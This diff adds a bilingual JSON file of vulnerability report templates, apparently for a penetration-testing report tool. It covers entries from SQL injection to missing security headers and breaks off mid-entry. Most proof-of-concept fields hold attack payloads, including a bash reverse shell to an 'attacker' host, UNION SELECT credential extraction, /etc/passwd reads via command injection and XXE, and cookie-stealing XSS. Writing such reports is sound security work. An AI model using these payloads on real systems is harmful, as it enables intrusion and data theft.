@@ -1,0 +1,632 @@
+{
+  "sqli": {
+    "key": "sqli",
+    "es": {
+      "title": "Inyección SQL (SQL Injection)",
+      "description": "Se ha detectado una vulnerabilidad de Inyección SQL que permite a un atacante manipular consultas SQL arbitrarias...",
+      "poc": "1. Identificar un campo de entrada vulnerable (login, búsqueda, parámetro URL)\n2. Inyectar: ' OR '1'='1' --\n3. Observar que la consulta devuelve resultados no autorizados\n4. Usar UNION SELECT para extraer datos: UNION SELECT username,password FROM users--",
+      "impact": "Un atacante podría acceder, modificar o eliminar datos sensibles de la base de datos...",
+      "remediation": "Implementar consultas preparadas (prepared statements) con parámetros parametrizados...",
+      "cvss": "8.1",
+      "reference": "OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection"
+    },
+    "en": {
+      "title": "SQL Injection",
+      "description": "A SQL Injection vulnerability has been detected that allows an attacker to manipulate arbitrary SQL queries...",
+      "poc": "1. Identify a vulnerable input field (login, search, URL parameter)\n2. Inject: ' OR '1'='1' --\n3. Observe unauthorized results are returned\n4. Use UNION SELECT to extract data: UNION SELECT username,password FROM users--",
+      "impact": "An attacker could access, modify or delete sensitive database data...",
+      "remediation": "Implement prepared statements with parameterized queries...",
+      "cvss": "8.1",
+      "reference": "OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection"
+    }
+  },
+  "xss": {
+    "key": "xss",
+    "es": {
+      "title": "Cross-Site Scripting (XSS)",
+      "description": "La aplicación no sanitiza adecuadamente la entrada del usuario permitiendo la inyección de scripts maliciosos...",
+      "poc": "1. Localizar un campo que refleje input (comentarios, búsqueda, perfil)\n2. Inyectar: <script>alert('XSS')</script>\n3. Si aparece el popup, probar: <img src=x onerror=alert(document.cookie)>\n4. Para XSS almacenado: el payload persiste y ejecuta en otros usuarios",
+      "impact": "Permite a un atacante ejecutar scripts en el navegador de la víctima...",
+      "remediation": "Implementar sanitización de entrada (input validation) y escaping de output...",
+      "cvss": "6.1",
+      "reference": "OWASP XSS: https://owasp.org/www-community/attacks/xss/"
+    },
+    "en": {
+      "title": "Cross-Site Scripting (XSS)",
+      "description": "The application does not properly sanitize user input allowing injection of malicious scripts...",
+      "poc": "1. Locate a field that reflects input (comments, search, profile)\n2. Inject: <script>alert('XSS')</script>\n3. If popup appears, try: <img src=x onerror=alert(document.cookie)>\n4. For stored XSS: payload persists and executes on other users",
+      "impact": "Allows an attacker to execute scripts in the victim's browser...",
+      "remediation": "Implement input validation and output escaping...",
+      "cvss": "6.1",
+      "reference": "OWASP XSS: https://owasp.org/www-community/attacks/xss/"
+    }
+  },
+  "idor": {
+    "key": "idor",
+    "es": {
+      "title": "IDOR (Insecure Direct Object Reference)",
+      "description": "Se ha detectado una vulnerabilidad IDOR que permite a un atacante acceder a recursos o datos de otros usuarios manipulando identificadores en las peticiones.",
+      "poc": "1. Identificar endpoints con IDs numéricos: /api/users/123/documents\n2. Cambiar el ID: /api/users/124/documents → acceder a datos de otro usuario\n3. Probar con diferentes métodos HTTP: GET, PUT, DELETE\n4. Verificar que no hay validación de propiedad del recurso",
+      "impact": "Un atacante podría acceder, modificar o eliminar datos de otros usuarios sin autorización, violando la confidencialidad e integridad de la información.",
+      "remediation": "Implementar controles de autorización en cada acceso a recursos, utilizar identificadores indirectos (GUIDs) y validar que el usuario autenticado tenga permisos sobre el recurso solicitado.",
+      "cvss": "7.5",
+      "reference": "OWASP IDOR: https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference"
+    },
+    "en": {
+      "title": "IDOR (Insecure Direct Object Reference)",
+      "description": "An IDOR vulnerability has been detected that allows an attacker to access other users' resources or data by manipulating identifiers in requests.",
+      "poc": "1. Identify endpoints with numeric IDs: /api/users/123/documents\n2. Change the ID: /api/users/124/documents → access another user's data\n3. Try different HTTP methods: GET, PUT, DELETE\n4. Verify no resource ownership validation exists",
+      "impact": "An attacker could access, modify or delete other users' data without authorization, violating data confidentiality and integrity.",
+      "remediation": "Implement authorization controls on every resource access, use indirect identifiers (GUIDs) and validate that the authenticated user has permissions over the requested resource.",
+      "cvss": "7.5",
+      "reference": "OWASP IDOR: https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference"
+    }
+  },
+  "ssrf": {
+    "key": "ssrf",
+    "es": {
+      "title": "SSRF (Server-Side Request Forgery)",
+      "description": "La aplicación permite que un atacante fuerce al servidor a realizar peticiones a recursos internos o externos controlados por el atacante.",
+      "poc": "1. Identificar parámetros que aceptan URLs: ?url=, ?target=, ?endpoint=\n2. Probar acceso a metadata cloud: http://169.254.169.254/latest/meta-data/\n3. Escaneo de puertos internos: http://localhost:22, http://127.0.0.1:3306\n4. Exfiltración de archivos: file:///etc/passwd o gopher://",
+      "impact": "Un atacante podría acceder a servicios internos, escanear puertos internos, acceder a metadata de cloud, o exfiltrar datos sensibles desde la red interna.",
+      "remediation": "Validar y sanitizar todas las URLs de entrada, usar listas blancas de dominios permitidos, deshabilitar esquemas peligrosos (file://, gopher://), y usar DNS resolving con validación.",
+      "cvss": "8.2",
+      "reference": "OWASP SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"
+    },
+    "en": {
+      "title": "SSRF (Server-Side Request Forgery)",
+      "description": "The application allows an attacker to force the server to make requests to internal or external resources controlled by the attacker.",
+      "poc": "1. Identify URL parameters: ?url=, ?target=, ?endpoint=\n2. Test cloud metadata access: http://169.254.169.254/latest/meta-data/\n3. Internal port scanning: http://localhost:22, http://127.0.0.1:3306\n4. File exfiltration: file:///etc/passwd or gopher://",
+      "impact": "An attacker could access internal services, scan internal ports, access cloud metadata, or exfiltrate sensitive data from the internal network.",
+      "remediation": "Validate and sanitize all input URLs, use whitelists of allowed domains, disable dangerous schemes (file://, gopher://), and use DNS resolving with validation.",
+      "cvss": "8.2",
+      "reference": "OWASP SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"
+    }
+  },
+  "csrf": {
+    "key": "csrf",
+    "es": {
+      "title": "CSRF (Cross-Site Request Forgery)",
+      "description": "La aplicación no implementa protección contra CSRF, permitiendo que un atacante induzca a un usuario autenticado a realizar acciones no deseadas.",
+      "poc": "1. Identificar formularios sin tokens CSRF (cambio de email, contraseña, transferencias)\n2. Crear página HTML maliciosa con form auto-submit\n3. Enviar víctima autenticada a la página: POST /change-password automático\n4. Verificar que la acción se ejecuta sin validación adicional",
+      "impact": "Un atacante podría realizar acciones en nombre del usuario (cambiar contraseña, realizar transferencias, modificar datos) sin su conocimiento o consentimiento.",
+      "remediation": "Implementar tokens CSRF únicos en formularios, usar el atributo SameSite en cookies, validar el header Origin/Referer, y reautenticar para acciones sensibles.",
+      "cvss": "6.8",
+      "reference": "OWASP CSRF: https://owasp.org/www-community/attacks/csrf"
+    },
+    "en": {
+      "title": "CSRF (Cross-Site Request Forgery)",
+      "description": "The application does not implement CSRF protection, allowing an attacker to induce an authenticated user to perform unwanted actions.",
+      "poc": "1. Identify forms without CSRF tokens (email change, password, transfers)\n2. Create malicious HTML page with auto-submit form\n3. Send authenticated victim to page: POST /change-password automatically\n4. Verify action executes without additional validation",
+      "impact": "An attacker could perform actions on behalf of the user (change password, make transfers, modify data) without their knowledge or consent.",
+      "remediation": "Implement unique CSRF tokens in forms, use SameSite cookie attribute, validate Origin/Referer headers, and re-authenticate for sensitive actions.",
+      "cvss": "6.8",
+      "reference": "OWASP CSRF: https://owasp.org/www-community/attacks/csrf"
+    }
+  },
+  "xxe": {
+    "key": "xxe",
+    "es": {
+      "title": "XXE (XML External Entity)",
+      "description": "El procesador XML de la aplicación permite entidades externas, permitiendo a un atacante leer archivos locales, realizar SSRF o causar DoS.",
+      "poc": "1. Identificar endpoints que procesan XML (SOAP, REST XML, import/export)\n2. Inyectar DOCTYPE con entidad externa: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n3. Usar la entidad en el cuerpo: &xxe;\n4. Para SSRF: <!ENTITY xxe SYSTEM \"http://internal-service/\">",
+      "impact": "Un atacante podría leer archivos locales del servidor, acceder a servicios internos, ejecutar SSRF, o causar denegación de servicio (DoS).",
+      "remediation": "Deshabilitar entidades externas y DTDs en el procesador XML (XXE=disable), usar formatos alternativos como JSON, y validar el input XML estrictamente.",
+      "cvss": "7.5",
+      "reference": "OWASP XXE: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
+    },
+    "en": {
+      "title": "XXE (XML External Entity)",
+      "description": "The application's XML processor allows external entities, enabling an attacker to read local files, perform SSRF, or cause DoS.",
+      "poc": "1. Identify XML processing endpoints (SOAP, REST XML, import/export)\n2. Inject DOCTYPE with external entity: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n3. Use entity in body: &xxe;\n4. For SSRF: <!ENTITY xxe SYSTEM \"http://internal-service/\">",
+      "impact": "An attacker could read local server files, access internal services, execute SSRF, or cause denial of service (DoS).",
+      "remediation": "Disable external entities and DTDs in the XML processor (XXE=disable), use alternative formats like JSON, and strictly validate XML input.",
+      "cvss": "7.5",
+      "reference": "OWASP XXE: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
+    }
+  },
+  "rce": {
+    "key": "rce",
+    "es": {
+      "title": "RCE (Remote Code Execution)",
+      "description": "La aplicación permite la ejecución de código arbitrario en el servidor mediante la inyección de comandos o código en funciones vulnerables.",
+      "poc": "1. Identificar funciones que ejecutan código: eval(), exec(), system(), passthru()\n2. Inyectar payload en parámetros: ; cat /etc/passwd, | whoami, $(id)\n3. Para webs: ?page=php://filter/convert.base64-encode/resource=/etc/passwd\n4. Reverse shell: bash -i >& /dev/tcp/attacker/4444 0>&1",
+      "impact": "Un atacante podría tomar control completo del servidor, acceder a datos sensibles, moverse lateralmente en la red o instalar malware persistente.",
+      "remediation": "Nunca ejecutar input del usuario sin validación, usar listas blancas de entrada, implementar sandboxing, y aplicar el principio de mínimo privilegio.",
+      "cvss": "9.8",
+      "reference": "OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection"
+    },
+    "en": {
+      "title": "RCE (Remote Code Execution)",
+      "description": "The application allows arbitrary code execution on the server by injecting commands or code into vulnerable functions.",
+      "poc": "1. Identify code execution functions: eval(), exec(), system(), passthru()\n2. Inject payload in parameters: ; cat /etc/passwd, | whoami, $(id)\n3. For web: ?page=php://filter/convert.base64-encode/resource=/etc/passwd\n4. Reverse shell: bash -i >& /dev/tcp/attacker/4444 0>&1",
+      "impact": "An attacker could take complete control of the server, access sensitive data, move laterally in the network, or install persistent malware.",
+      "remediation": "Never execute user input without validation, use input whitelists, implement sandboxing, and apply the principle of least privilege.",
+      "cvss": "9.8",
+      "reference": "OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection"
+    }
+  },
+  "lfi": {
+    "key": "lfi",
+    "es": {
+      "title": "LFI (Local File Inclusion)",
+      "description": "La aplicación permite incluir archivos locales del servidor mediante la manipulación de parámetros, permitiendo leer archivos sensibles.",
+      "poc": "1. Identificar parámetros de inclusión: ?page=, ?file=, ?include=\n2. Probar con paths relativos: ?page=../../../etc/passwd\n3. Null byte bypass (PHP < 5.3.4): ?page=../../../etc/passwd%00\n4. Wrapper PHP: php://filter/convert.base64-encode/resource=/etc/passwd",
+      "impact": "Un atacante podría leer archivos sensibles del sistema (/etc/passwd, archivos de configuración, código fuente) o potencialmente ejecutar código.",
+      "remediation": "Validar y sanitizar rutas de archivo, usar listas blancas de archivos permitidos, evitar usar input del usuario en rutas, y deshabilitar funciones peligrosas.",
+      "cvss": "7.1",
+      "reference": "OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal"
+    },
+    "en": {
+      "title": "LFI (Local File Inclusion)",
+      "description": "The application allows including local server files by manipulating parameters, enabling reading of sensitive files.",
+      "poc": "1. Identify inclusion parameters: ?page=, ?file=, ?include=\n2. Try relative paths: ?page=../../../etc/passwd\n3. Null byte bypass (PHP < 5.3.4): ?page=../../../etc/passwd%00\n4. PHP wrapper: php://filter/convert.base64-encode/resource=/etc/passwd",
+      "impact": "An attacker could read sensitive system files (/etc/passwd, configuration files, source code) or potentially execute code.",
+      "remediation": "Validate and sanitize file paths, use whitelists of allowed files, avoid using user input in paths, and disable dangerous functions.",
+      "cvss": "7.1",
+      "reference": "OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal"
+    }
+  },
+  "cors": {
+    "key": "cors",
+    "es": {
+      "title": "CORS Misconfiguration",
+      "description": "La configuración CORS de la aplicación es incorrecta, permitiendo que sitios maliciosos realicen peticiones en nombre de usuarios autenticados.",
+      "poc": "1. Verificar headers CORS: Access-Control-Allow-Origin: *\n2. Probar con Origin header malicioso: Origin: https://evil.com\n3. Verificar si credenciales están permitidas con wildcard\n4. Crear script en evil.com que haga fetch autenticado a la API",
+      "impact": "Un atacante podría realizar peticiones autenticadas desde dominios maliciosos, acceder a datos sensibles o realizar acciones no autorizadas.",
+      "remediation": "Validar el header Origin contra una lista blanca, no usar wildcard (*) con credenciales, y implementar headers CORS restrictivos según el recurso.",
+      "cvss": "6.1",
+      "reference": "OWASP CORS: https://owasp.org/www-community/attacks/CORS_Misconfiguration"
+    },
+    "en": {
+      "title": "CORS Misconfiguration",
+      "description": "The application's CORS configuration is incorrect, allowing malicious sites to make requests on behalf of authenticated users.",
+      "poc": "1. Check CORS headers: Access-Control-Allow-Origin: *\n2. Test with malicious Origin header: Origin: https://evil.com\n3. Verify credentials allowed with wildcard\n4. Create script on evil.com making authenticated fetch to API",
+      "impact": "An attacker could make authenticated requests from malicious domains, access sensitive data, or perform unauthorized actions.",
+      "remediation": "Validate Origin header against a whitelist, do not use wildcard (*) with credentials, and implement restrictive CORS headers per resource.",
+      "cvss": "6.1",
+      "reference": "OWASP CORS: https://owasp.org/www-community/attacks/CORS_Misconfiguration"
+    }
+  },
+  "path_traversal": {
+    "key": "path_traversal",
+    "es": {
+      "title": "Path Traversal / Directory Traversal",
+      "description": "La aplicación no valida adecuadamente las rutas de archivo, permitiendo a un atacante acceder a directorios y archivos fuera del directorio permitido.",
+      "poc": "1. Identificar parámetros de descarga/archivo: ?download=report.pdf\n2. Probar secuencias de traversal: ?download=../../../etc/passwd\n3. Codificaciones alternativas: ..%2f..%2f..%2fetc/passwd\n4. Bypass con doble encoding: %252e%252e%252fetc%252fpasswd",
+      "impact": "Un atacante podría acceder a archivos sensibles del sistema operativo, archivos de configuración, logs, o código fuente de la aplicación.",
+      "remediation": "Validar y sanitizar rutas eliminando secuencias como ../, usar chroot jails, validar extensiones permitidas, y usar APIs de archivos seguras.",
+      "cvss": "7.5",
+      "reference": "OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal"
+    },
+    "en": {
+      "title": "Path Traversal / Directory Traversal",
+      "description": "The application does not properly validate file paths, allowing an attacker to access directories and files outside the allowed directory.",
+      "poc": "1. Identify download/file parameters: ?download=report.pdf\n2. Try traversal sequences: ?download=../../../etc/passwd\n3. Alternative encodings: ..%2f..%2f..%2fetc/passwd\n4. Double encoding bypass: %252e%252e%252fetc%252fpasswd",
+      "impact": "An attacker could access sensitive operating system files, configuration files, logs, or application source code.",
+      "remediation": "Validate and sanitize paths removing sequences like ../, use chroot jails, validate allowed extensions, and use safe file APIs.",
+      "cvss": "7.5",
+      "reference": "OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal"
+    }
+  },
+  "command_injection": {
+    "key": "command_injection",
+    "es": {
+      "title": "Command Injection",
+      "description": "La aplicación ejecuta comandos del sistema operativo incluyendo input del usuario sin validación adecuada, permitiendo la ejecución de comandos arbitrarios.",
+      "poc": "1. Identificar funciones de sistema: ping, nslookup, whois, traceroute\n2. Inyectar comandos adicionales: ; cat /etc/passwd, && whoami, | id\n3. Redirección de output: `comando` > /var/www/output.txt\n4. Blind command injection: ; sleep 5 (time-based detection)",
+      "impact": "Un atacante podría ejecutar comandos arbitrarios en el servidor, comprometer el sistema completo, o usarlo como pivot para ataques internos.",
+      "remediation": "Evitar ejecutar comandos del sistema con input del usuario, usar APIs seguras, implementar listas blancas estrictas, y sanitizar input eliminando metacaracteres.",
+      "cvss": "9.1",
+      "reference": "OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection"
+    },
+    "en": {
+      "title": "Command Injection",
+      "description": "The application executes operating system commands including user input without proper validation, allowing arbitrary command execution.",
+      "poc": "1. Identify system functions: ping, nslookup, whois, traceroute\n2. Inject additional commands: ; cat /etc/passwd, && whoami, | id\n3. Output redirection: `command` > /var/www/output.txt\n4. Blind command injection: ; sleep 5 (time-based detection)",
+      "impact": "An attacker could execute arbitrary commands on the server, compromise the entire system, or use it as a pivot for internal attacks.",
+      "remediation": "Avoid executing system commands with user input, use secure APIs, implement strict whitelists, and sanitize input removing metacharacters.",
+      "cvss": "9.1",
+      "reference": "OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection"
+    }
+  },
+  "insecure_deserialization": {
+    "key": "insecure_deserialization",
+    "es": {
+      "title": "Insecure Deserialization",
+      "description": "La aplicación deserializa datos sin validación adecuada, permitiendo a un atacante manipular objetos serializados para ejecutar código o modificar lógica.",
+      "poc": "1. Identificar puntos de deserialización: cookies, parámetros, mensajes de cola\n2. Para Java: ysoserial para generar payloads (CommonsCollections, etc.)\n3. Para PHP: manipulación de objetos PHP serializados\n4. Para .NET: gadgets de deserialización con ObjectDataProvider",
+      "impact": "Un atacante podría ejecutar código arbitrario, realizar escalada de privilegios, o manipular la lógica de negocio de la aplicación.",
+      "remediation": "No deserializar datos de fuentes no confiables, usar formatos seguros como JSON, implementar firmas digitales, y usar deserialización con tipos estrictos.",
+      "cvss": "8.1",
+      "reference": "OWASP Deserialization: https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data"
+    },
+    "en": {
+      "title": "Insecure Deserialization",
+      "description": "The application deserializes data without proper validation, allowing an attacker to manipulate serialized objects to execute code or modify logic.",
+      "poc": "1. Identify deserialization points: cookies, parameters, queue messages\n2. For Java: ysoserial to generate payloads (CommonsCollections, etc.)\n3. For PHP: manipulate serialized PHP objects\n4. For .NET: deserialization gadgets with ObjectDataProvider",
+      "impact": "An attacker could execute arbitrary code, escalate privileges, or manipulate the application's business logic.",
+      "remediation": "Do not deserialize data from untrusted sources, use safe formats like JSON, implement digital signatures, and use deserialization with strict typing.",
+      "cvss": "8.1",
+      "reference": "OWASP Deserialization: https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data"
+    }
+  },
+  "jwt_bypass": {
+    "key": "jwt_bypass",
+    "es": {
+      "title": "JWT Authentication Bypass",
+      "description": "La implementación JWT de la aplicación es vulnerable a bypass mediante algoritmo \"none\", claves débiles, o falta de validación de firma.",
+      "poc": "1. Decodificar JWT en jwt.io para ver estructura\n2. Probar algoritmo \"none\": cambiar alg a \"none\" y eliminar firma\n3. Cracking de clave débil: jwt_tool o hashcat para HS256\n4. Manipulación de algoritmo RS256→HS256 con clave pública",
+      "impact": "Un atacante podría falsificar tokens JWT, impersonar otros usuarios, escalar privilegios, o acceder a funcionalidades protegidas sin autenticación.",
+      "remediation": "Validar estrictamente el algoritmo JWT, usar claves seguras (HS256+ o RS256), validar expiración y issuer, y almacenar claves de forma segura.",
+      "cvss": "8.2",
+      "reference": "OWASP JWT Security: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_JSON_Web_Tokens"
+    },
+    "en": {
+      "title": "JWT Authentication Bypass",
+      "description": "The application's JWT implementation is vulnerable to bypass using \"none\" algorithm, weak keys, or lack of signature validation.",
+      "poc": "1. Decode JWT at jwt.io to see structure\n2. Test \"none\" algorithm: change alg to \"none\" and remove signature\n3. Crack weak key: jwt_tool or hashcat for HS256\n4. RS256→HS256 manipulation with public key",
+      "impact": "An attacker could forge JWT tokens, impersonate other users, escalate privileges, or access protected functionality without authentication.",
+      "remediation": "Strictly validate JWT algorithm, use secure keys (HS256+ or RS256), validate expiration and issuer, and store keys securely.",
+      "cvss": "8.2",
+      "reference": "OWASP JWT Security: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_JSON_Web_Tokens"
+    }
+  },
+  "file_upload": {
+    "key": "file_upload",
+    "es": {
+      "title": "Insecure File Upload",
+      "description": "La funcionalidad de subida de archivos no valida adecuadamente tipos de archivo, permitiendo subir archivos ejecutables o peligrosos.",
+      "poc": "1. Subir archivo con extensión peligrosa: shell.php, malware.exe\n2. Bypass de extensión: shell.php5, shell.phtml, shell.php.jpg\n3. Manipulación MIME type: cambiar Content-Type a image/jpeg\n4. Upload de polyglot: imagen con código PHP/Javascript embebido",
+      "impact": "Un atacante podría subir archivos maliciosos (webshells, ejecutables), ejecutar código en el servidor, o realizar ataques contra otros usuarios.",
+      "remediation": "Validar extensiones y tipos MIME con listas blancas, escanear archivos con antivirus, renombrar archivos al subir, y almacenar fuera del web root.",
+      "cvss": "7.5",
+      "reference": "OWASP File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
+    },
+    "en": {
+      "title": "Insecure File Upload",
+      "description": "The file upload functionality does not properly validate file types, allowing upload of executable or dangerous files.",
+      "poc": "1. Upload file with dangerous extension: shell.php, malware.exe\n2. Extension bypass: shell.php5, shell.phtml, shell.php.jpg\n3. MIME type manipulation: change Content-Type to image/jpeg\n4. Polyglot upload: image with embedded PHP/Javascript code",
+      "impact": "An attacker could upload malicious files (webshells, executables), execute code on the server, or perform attacks against other users.",
+      "remediation": "Validate extensions and MIME types with whitelists, scan files with antivirus, rename files on upload, and store outside web root.",
+      "cvss": "7.5",
+      "reference": "OWASP File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
+    }
+  },
+  "security_misconfig": {
+    "key": "security_misconfig",
+    "es": {
+      "title": "Security Misconfiguration",
+      "description": "La aplicación presenta configuraciones de seguridad incorrectas, credenciales por defecto, headers de seguridad faltantes, o información de debugging expuesta.",
+      "poc": "1. Verificar headers de seguridad faltantes: X-Frame-Options, CSP, HSTS\n2. Buscar información de debug: stack traces, versión de servidor\n3. Verificar credenciales por defecto: admin/admin, root/toor\n4. Revisar permisos excesivos en directorios y archivos sensibles",
+      "impact": "Un atacante podría explotar configuraciones débiles para acceder a datos sensibles, escalar privilegios, o comprometer el sistema.",
+      "remediation": "Implementar hardening del servidor, cambiar credenciales por defecto, deshabilitar debugging en producción, y usar headers de seguridad apropiados.",
+      "cvss": "6.5",
+      "reference": "OWASP Security Misconfiguration: https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
+    },
+    "en": {
+      "title": "Security Misconfiguration",
+      "description": "The application has incorrect security configurations, default credentials, missing security headers, or exposed debugging information.",
+      "poc": "1. Check for missing security headers: X-Frame-Options, CSP, HSTS\n2. Search for debug info: stack traces, server version\n3. Verify default credentials: admin/admin, root/toor\n4. Review excessive permissions on directories and sensitive files",
+      "impact": "An attacker could exploit weak configurations to access sensitive data, escalate privileges, or compromise the system.",
+      "remediation": "Implement server hardening, change default credentials, disable debugging in production, and use appropriate security headers.",
+      "cvss": "6.5",
+      "reference": "OWASP Security Misconfiguration: https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
+    }
+  },
+  "missing_csp": {
+    "key": "missing_csp",
+    "es": {
+      "title": "Falta de Cabecera Content-Security-Policy",
+      "description": "La aplicación no implementa la cabecera HTTP Content-Security-Policy (CSP), permitiendo la ejecución de scripts maliciosos, inyección de contenido y otros ataques basados en contenido.",
+      "poc": "1. Verificar cabeceras de respuesta: buscar Content-Security-Policy\n2. Si falta, probar inyección de scripts: <script>alert('CSP Missing')</script>\n3. Verificar carga de recursos externos sin restricciones\n4. Comprobar ejecución de inline scripts y eval()",
+      "impact": "Un atacante podría ejecutar ataques XSS, inyectar contenido malicioso, cargar recursos desde dominios no confiables, o realizar clickjacking.",
+      "remediation": "Implementar cabecera Content-Security-Policy con directivas restrictivas: default-src 'self', script-src 'self', object-src 'none', frame-ancestors 'none'. Usar nonces o hashes para scripts inline.",
+      "cvss": "5.3",
+      "reference": "OWASP CSP: https://owasp.org/www-community/controls/Content_Security_Policy"
+    },
+    "en": {
+      "title": "Missing Content-Security-Policy Header",
+      "description": "The application does not implement the Content-Security-Policy (CSP) HTTP header, allowing execution of malicious scripts, content injection and other content-based attacks.",
+      "poc": "1. Check response headers: look for Content-Security-Policy\n2. If missing, test script injection: <script>alert('CSP Missing')</script>\n3. Verify loading of external resources without restrictions\n4. Check execution of inline scripts and eval()",
+      "impact": "An attacker could execute XSS attacks, inject malicious content, load resources from untrusted domains, or perform clickjacking.",
+      "remediation": "Implement Content-Security-Policy header with restrictive directives: default-src 'self', script-src 'self', object-src 'none', frame-ancestors 'none'. Use nonces or hashes for inline scripts.",
+      "cvss": "5.3",
+      "reference": "OWASP CSP: https://owasp.org/www-community/controls/Content_Security_Policy"
+    }
+  },
+  "missing_x_frame": {
+    "key": "missing_x_frame",
+    "es": {
+      "title": "Falta de Cabecera X-Frame-Options",
+      "description": "La aplicación no implementa la cabecera HTTP X-Frame-Options, permitiendo que la página sea embebida en iframes de dominios maliciosos.",
+      "poc": "1. Verificar cabeceras de respuesta: buscar X-Frame-Options\n2. Crear página HTML con iframe apuntando a la aplicación\n3. Verificar que la página carga correctamente dentro del iframe\n4. Probar ataques de clickjacking sobre elementos sensibles",
+      "impact": "Un atacante podría realizar ataques de clickjacking, UI redressing, o engañar a los usuarios para que interactúen con la aplicación de forma involuntaria.",
+      "remediation": "Implementar cabecera X-Frame-Options: DENY o SAMEORIGIN. Alternativamente, usar CSP con frame-ancestors 'none' o frame-ancestors 'self'.",
+      "cvss": "5.2",
+      "reference": "OWASP Clickjacking: https://owasp.org/www-community/attacks/Clickjacking"
+    },
+    "en": {
+      "title": "Missing X-Frame-Options Header",
+      "description": "The application does not implement the X-Frame-Options HTTP header, allowing the page to be embedded in iframes from malicious domains.",
+      "poc": "1. Check response headers: look for X-Frame-Options\n2. Create HTML page with iframe pointing to the application\n3. Verify the page loads correctly inside the iframe\n4. Test clickjacking attacks on sensitive elements",
+      "impact": "An attacker could perform clickjacking attacks, UI redressing, or trick users into interacting with the application unintentionally.",
+      "remediation": "Implement X-Frame-Options header: DENY or SAMEORIGIN. Alternatively, use CSP with frame-ancestors 'none' or frame-ancestors 'self'.",
+      "cvss": "5.2",
+      "reference": "OWASP Clickjacking: https://owasp.org/www-community/attacks/Clickjacking"
+    }
+  },
+  "missing_x_content_type": {
+    "key": "missing_x_content_type",
+    "es": {
+      "title": "Falta de Cabecera X-Content-Type-Options",
+      "description": "La aplicación no implementa la cabecera HTTP X-Content-Type-Options: nosniff, permitiendo que el navegador interprete archivos de forma diferente a su tipo MIME declarado.",
+      "poc": "1. Verificar cabeceras de respuesta: buscar X-Content-Type-Options\n2. Subir archivo con extensión inocua pero contenido ejecutable\n3. Verificar si el navegador ejecuta el contenido basándose en el contenido del archivo\n4. Probar con archivos que contengan código JavaScript o CSS malicioso",
+      "impact": "Un atacante podría ejecutar código malicioso mediante MIME sniffing, llevar a cabo ataques XSS o hacer que el navegador interprete datos sensibles como ejecutables.",
+      "remediation": "Implementar cabecera X-Content-Type-Options: nosniff en todas las respuestas para prevenir que el navegador realice MIME sniffing.",
+      "cvss": "4.3",
+      "reference": "OWASP MIME Sniffing: https://owasp.org/www-community/attacks/Content_Sniffing"
+    },
+    "en": {
+      "title": "Missing X-Content-Type-Options Header",
+      "description": "The application does not implement the X-Content-Type-Options: nosniff HTTP header, allowing the browser to interpret files differently from their declared MIME type.",
+      "poc": "1. Check response headers: look for X-Content-Type-Options\n2. Upload file with innocent extension but executable content\n3. Verify if browser executes content based on file content\n4. Test with files containing malicious JavaScript or CSS code",
+      "impact": "An attacker could execute malicious code via MIME sniffing, carry out XSS attacks, or make the browser interpret sensitive data as executable.",
+      "remediation": "Implement X-Content-Type-Options: nosniff header on all responses to prevent the browser from performing MIME sniffing.",
+      "cvss": "4.3",
+      "reference": "OWASP MIME Sniffing: https://owasp.org/www-community/attacks/Content_Sniffing"
+    }
+  },
+  "missing_referrer": {
+    "key": "missing_referrer",
+    "es": {
+      "title": "Falta de Cabecera Referrer-Policy",
+      "description": "La aplicación no implementa una política Referrer-Policy adecuada, permitiendo la filtración de información sensible en la cabecera Referer a sitios externos.",
+      "poc": "1. Verificar cabeceras de respuesta: buscar Referrer-Policy\n2. Navegar a páginas con parámetros sensibles en la URL\n3. Hacer clic en enlaces externos y verificar la información enviada en el header Referer\n4. Comprobar si URLs con tokens o datos sensibles se filtran a terceros",
+      "impact": "Información sensible como tokens de sesión, IDs internos o datos personales pueden filtrarse a sitios externos a través de la cabecera Referer.",
+      "remediation": "Implementar cabecera Referrer-Policy con valores restrictivos: no-referrer, strict-origin-when-cross-origin, o no-referrer-when-downgrade según los requisitos.",
+      "cvss": "4.0",
+      "reference": "OWASP Information Disclosure: https://owasp.org/www-community/vulnerabilities/Information_Disclosure"
+    },
+    "en": {
+      "title": "Missing Referrer-Policy Header",
+      "description": "The application does not implement an appropriate Referrer-Policy, allowing sensitive information to leak in the Referer header to external sites.",
+      "poc": "1. Check response headers: look for Referrer-Policy\n2. Navigate to pages with sensitive parameters in the URL\n3. Click external links and verify information sent in Referer header\n4. Check if URLs with tokens or sensitive data leak to third parties",
+      "impact": "Sensitive information such as session tokens, internal IDs or personal data may leak to external sites through the Referer header.",
+      "remediation": "Implement Referrer-Policy header with restrictive values: no-referrer, strict-origin-when-cross-origin, or no-referrer-when-downgrade depending on requirements.",
+      "cvss": "4.0",
+      "reference": "OWASP Information Disclosure: https://owasp.org/www-community/vulnerabilities/Information_Disclosure"
+    }
+  },
+  "missing_permissions": {
+    "key": "missing_permissions",
+    "es": {
+      "title": "Falta de Cabecera Permissions-Policy",
